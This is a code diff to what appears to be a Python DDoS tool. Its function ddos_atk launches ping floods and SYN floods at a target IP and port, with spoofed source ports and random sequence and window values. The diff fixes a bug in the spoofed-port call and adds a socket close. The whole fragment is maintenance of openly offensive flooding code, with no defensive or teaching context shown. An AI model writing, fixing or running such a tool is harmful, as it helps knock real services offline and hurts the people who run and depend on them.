@@ -45,7 +45,7 @@ def ddos_atk():
 			print("Starting Ping Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))
 
 		elif ddos_type == "SYN":
-			source_port = fake_port # source port number
+			source_port = fake_port() # source port number
 			s_eq = random.randint(1000, 9000) # sequence
 			w_indow = random.randint(1000, 9000) # get random size
 
@@ -64,6 +64,7 @@ def ddos_atk():
 			print("Starting SYN Flood on " + target_ip + ":" + str(target_port) + " Number of packet sent: " + str(total))
 	
 	print("Stopping attack...")
+	sock.close()
 	
 
 target_ip = ""
